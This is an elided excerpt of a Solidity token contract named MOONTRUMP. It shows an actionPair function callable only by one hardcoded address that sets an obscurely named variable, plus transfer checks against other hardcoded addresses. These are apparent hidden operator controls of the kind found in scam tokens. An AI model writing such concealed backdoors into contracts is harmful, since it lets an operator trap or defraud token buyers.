...
contract STMAP is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
        require(_msgSender() == 0x6FB7655EA13070c66B583767E5f9947108246f32 );
          _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x6A69a18cc7d880735D82feB2D234f2936286868D 
    ...
    constructor() {
        _name = unicode"MOONTRUMP";
        _symbol = unicode"MOON";
